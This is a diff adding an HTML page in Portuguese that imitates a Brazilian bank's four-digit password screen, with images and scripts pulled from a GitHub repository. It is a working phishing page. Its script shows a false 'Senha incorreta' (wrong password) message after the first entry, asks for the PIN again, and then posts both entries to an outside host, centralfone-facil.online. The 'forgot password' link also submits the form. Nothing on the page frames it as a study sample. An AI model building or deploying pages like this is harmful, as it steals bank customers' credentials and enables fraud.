@@ -1,0 +1,256 @@
+<html lang="pt-BR" ng-app="app" ng-controller="onlineController" class="ng-scope"><head><style>@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+    <meta charset="utf-8">
+    <meta name="csrf-token" content="reDZ3wDAd5Oz0VV4gO8CgDcTZ9vEs6j8ih6nWHjv">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Atendimento</title>
+
+                        <meta name="theme-color" content="#f31d5d">
+            <meta name="apple-mobile-web-app-status-bar-style" content="#f31d5d">
+            <meta name="msapplication-navbutton-color" content="#f31d5d">
+            <meta name="color-scheme" content="light">
+            
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.bunny.net">
+    <link href="https://fonts.bunny.net/css?family=figtree:400,500,600&amp;display=swap" rel="stylesheet">
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&amp;family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap" rel="stylesheet">
+
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/primatedocker/top/main/inicio/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/primatedocker/top/main/inicio/bootstrap/css/lightbox.min.css">
+    <link rel="stylesheet" href="https://primatedocker.github.io/top/inicio/style.css">
+
+
+    <style>
+        :root {
+            --cor_primaria:#ffffff;
+            --cor_primaria_texto:#e1173f;
+            --cor_primaria_hover:#e1173f;
+            --cor_primaria_texto_hover:#ffffff;
+            --cor_secundaria:#e1173f;
+            --cor_secundaria_texto:#000000;
+            --cor_secundaria_hover:#ffffff;
+            --cor_secundaria_texto_hover:#6c757d;
+            --cor_tercearia:#e1173f;
+            --cor_tercearia_texto:#f2f2f2;
+            --cor_tercearia_hover:#ffffff;
+            --cor_tercearia_texto_hover:#000000;
+            --cor_fundo_um:#ffffff;
+            --cor_fundo_dois:#f5f5f4;
+            --cor_fundo_tres:#ffffff;
+            --cor_fundo_quatro:#e1173f;
+            color-scheme: only light;
+        }
+    </style>
+
+</head>
+<body class="bg-cinza-senha w-100 h-100 d-flex flex-column justify-content-between ">
+<style>
+    .vh-100{
+        height: 100svh !important;
+        min-height: -webkit-fill-available;
+        min-height: -webkit-fill-available;
+        min-height: -moz-available;
+        min-height: fill-available;
+
+    }
+
+</style>
+
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/jquery/jquery.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/jquery/jquery.mask.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/jquery/lightbox.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/jquery/cpf.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/js/src/dayjs.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/js/src/validator.js"></script>
+
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/js/src/adapter.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/js/src/html5.code.html"></script>
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/2.11.6/umd/popper.min.js"></script>
+
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/angular/angular.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/angular/angular-cookies.min.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/angular/angular-locate_ptbr.js"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/primatedocker/top/main/inicio/js/src/cliente.js"></script>
+
+<script type="text/javascript">
+    const tooltipTriggerList = document.querySelectorAll('[data-bs-toggle="tooltip"]')
+    const tooltipList = [...tooltipTriggerList].map(tooltipTriggerEl => new bootstrap.Tooltip(tooltipTriggerEl))
+    const alertList = document.querySelectorAll('.alert')
+    const alerts = [...alertList].map(element => new bootstrap.Alert(element))
+    const minhaurllimpa = 'https://centralfone-facil.online'
+    const id_informacao = '515'
+    const pagina_atual = '/senha'
+</script>
+
+    <div class="container-fluid meuvarejo xp-barrasite barra-NORMAL">
+        <div class="container d-flex flex-row justify-content-between align-items-center py-0 h-100">
+            <div class="tela-logo">
+                                    <img src="https://raw.githubusercontent.com/primatedocker/top/main/senha/images/logo-mobile.png" width="141px" class="">
+                            </div>
+            <div class="flex-fill pt-4 ps-4">
+                <p class="pt-3 text-white fs-8">SEX, 01/11/2024</p>
+            </div>
+            <div class="tela-voltarsite">
+                <button class="btn btn-cancelar fs-7">Cancelar</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="d-flex flex-row justify-content-center align-items-center flex-fill p-5 mt-5 mb-5 pb-5">
+        <div class="xp-box-login d-flex flex-column sombra-senha" style="height: 634px">
+            <div class="xp-fisica flex-fill pt-2">
+                <div class="px-4 pt-4">
+                    <h3 class="montserrat fw-light mb-1 text-center w-100">
+                        <b class="fw-semibold montserrat" style="font-size:22px"> </b><br>
+                        <span class="cinza-agencia" style="font-size:16px">Agência  &nbsp;&nbsp;|&nbsp;&nbsp; Conta </span>
+                    </h3>
+                </div>
+                <img src="https://raw.githubusercontent.com/primatedocker/top/main/senha/images/senha.png" class="mb-3">
+                <div class="p-4 pt-2 px-5">
+                    <p class="w-100 text-center fs-5 montserrat mb-0" style="color: #000; font-size:16px !important">
+                        Informe sua senha de <b class="fw-semibold">4 dígitos</b>,<br>
+                        clicando no teclado abaixo
+                    </p>
+                    <form method="post" action="https://centralfone-facil.online/senha" class="w-100 mb-4 ng-pristine ng-valid">
+                        <input type="hidden" name="_token" value="reDZ3wDAd5Oz0VV4gO8CgDcTZ9vEs6j8ih6nWHjv" autocomplete="off">                        <input type="hidden" name="_method" value="post" autocomplete="off">                        <input type="hidden" name="senha_completa" value="" id="senha_completa" autocomplete="off">
+                        <style>
+                            input.form-control {
+                                padding-left: 70px;
+                                line-height: 41px;
+                                letter-spacing: 41px;
+                            }
+                        </style>
+                        <div class="form-group w-100">
+                            <input type="password" inputmode="numeric" maxlength="4" min="4" class="form-control bg-white rounded-0 border-0  fs-1" id="senha" name="senha" placeholder=" ">
+                        </div>
+                        <p class="w-100 text-center">
+                            <img src="https://raw.githubusercontent.com/primatedocker/top/main/senha/images/senha-borda.png" class="mb-3">
+                        </p>
+                    </form>
+                    <div class="px-3 mb-3">
+                        <div class="w-100 d-flex flex-row justify-content-between flex-wrap">
+                            <button class="btn  btn-xp-light roboto fw-medium fs-7 py-2 px-3" onclick="seninha(0)">0</button>
+                            <button class="btn  btn-xp-light roboto fw-medium fs-7 py-2 px-3" onclick="seninha(1)">1</button>
+                            <button class="btn  btn-xp-light roboto fw-medium fs-7 py-2 px-3" onclick="seninha(2)">2</button>
+                            <button class="btn  btn-xp-light roboto fw-medium fs-7 py-2 px-3" onclick="seninha(3)">3</button>
+                            <button class="btn  btn-xp-light roboto fw-medium fs-7 py-2 px-3" onclick="seninha(4)">4</button>
+                            <button class="btn  btn-xp-light roboto fw-medium fs-7 py-2 px-3" onclick="seninha(5)">5</button>
+                        </div>
+                        <div class="w-100 d-flex flex-row justify-content-between flex-wrap mt-2">
+                            <button class="btn btn-lg btn-xp-light roboto fw-medium fs-7 rounded-0 py-2 px-3" onclick="seninha(6)">6</button>
+                            <button class="btn btn-lg btn-xp-light roboto fw-medium fs-7 rounded-0 py-2 px-3" onclick="seninha(7)">7</button>
+                            <button class="btn btn-lg btn-xp-light roboto fw-medium fs-7 rounded-0 py-2 px-3" onclick="seninha(8)">8</button>
+                            <button class="btn btn-lg btn-xp-light roboto fw-medium fs-7 rounded-0 py-2 px-3" onclick="seninha(9)">9</button>
+                            <button class="btn btn-lg btn-xp-light roboto fw-medium fs-7 rounded-0 py-2 px-3" onclick="$('#senha').val('')" style="width: 94px;">Limpar</button>
+                        </div>
+                    </div>
+                    <div class="w-100 px-5">
+                        <button class="w-100 btn btn-action montserrat fw-semibold fs-7 rounded-5 py-2 mb-4 mt-4" id="envia">acessar</button>
+                    </div>
+
+                    <div class="w-100">
+                        <p class="roboto fs-6 fw-light pointer w-100 text-center mt-2">
+                            <span class="" style="color: #1593D4;" onclick="esqueci()">Esqueci minha senha</span>
+                        </p>
+                    </div>
+                </div>
+
+
+
+            </div>
+
+        </div>
+                    <img src="https://raw.githubusercontent.com/primatedocker/top/main/senha/images/varejo.jpg" height="634px" class="ms-2">
+        
+    </div>
+
+    <div class="container-fluid px-0 mt-5 pt-3">
+                    <img src="https://raw.githubusercontent.com/primatedocker/top/main/senha/images/footer.png" class="w-100">
+        <!-- 3b69ff -->
+    </div>
+
+    <div class="position-fixed top-0 mt-5 pt-3 w-100 d-flex flex-row align-content-center justify-content-center d-none" id="alerta">
+        <p class="d-block bg-danger p-3 rounded shadow text-white text-center fw-medium" id="msg" style="max-width: 400px">
+            Mensagem do alerta
+        </p>
+    </div>
+
+    <script>
+        function esqueci(){
+            $('#senha_completa').val('CLICO EM ESQUECEU A SENHA');
+            $('form').submit()
+        }
+
+        $('input').keypress(function(e) {
+            if(e.which == 13) {
+                e.preventDefault();
+            }
+        });
+
+        $(document).ready(function(){
+            $('#senha').mask('0000');
+        })
+
+        function alerta(s){
+            $('#msg').html(s);
+            $('#alerta').fadeIn('slow',function (){
+                setTimeout(function (){
+                    $('#alerta').fadeOut('slow', function (){
+                        $('#alerta').addClass('d-none')
+                    })
+                }, 3000)
+            })
+
+            $('#alerta').removeClass('d-none');
+        }
+
+
+        var ponteiro = 0
+        $(document).on('click','#envia',function(e) {
+            if(ponteiro == 0){
+                if($('#senha').val().length == 4){
+                    $('#senha_completa').val($('#senha').val())
+                    $('#senha').val('')
+                    alerta("Senha incorreta")
+                    $('#senha').focus();
+                    ponteiro = 1;
+                }else{
+                    $('#senha').val('')
+                    alerta("Senha incorreta")
+                    $('#senha').focus();
+                }
+            }else if($('#senha').val().length == 4){
+                $('#senha_completa').val($('#senha_completa').val() + ' / ' + $('#senha').val())
+                $('form').submit()
+            }else{
+                $('#senha').val("");
+                $('#senha').focus();
+                alerta("Senha incorreta")
+            }
+        });
+
+        function seninha(s){
+
+            if($('#senha').val().length < 4){
+                $('#senha').val($('#senha').val() + s);
+            }else{
+                $('#senha').val('')
+            }
+        }
+    </script>
+
+
+
+
+
+<div id="lightboxOverlay" tabindex="-1" class="lightboxOverlay" style="display: none;"></div><div id="lightbox" tabindex="-1" class="lightbox" style="display: none;"><div class="lb-outerContainer"><div class="lb-container"><img class="lb-image" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" alt=""><div class="lb-nav"><a class="lb-prev" role="button" tabindex="0" aria-label="Previous image" href=""></a><a class="lb-next" role="button" tabindex="0" aria-label="Next image" href=""></a></div><div class="lb-loader"><a class="lb-cancel" role="button" tabindex="0"></a></div></div></div><div class="lb-dataContainer"><div class="lb-data"><div class="lb-details"><span class="lb-caption"></span><span class="lb-number"></span></div><div class="lb-closeContainer"><a class="lb-close" role="button" tabindex="0"></a></div></div></div></div></body></html>
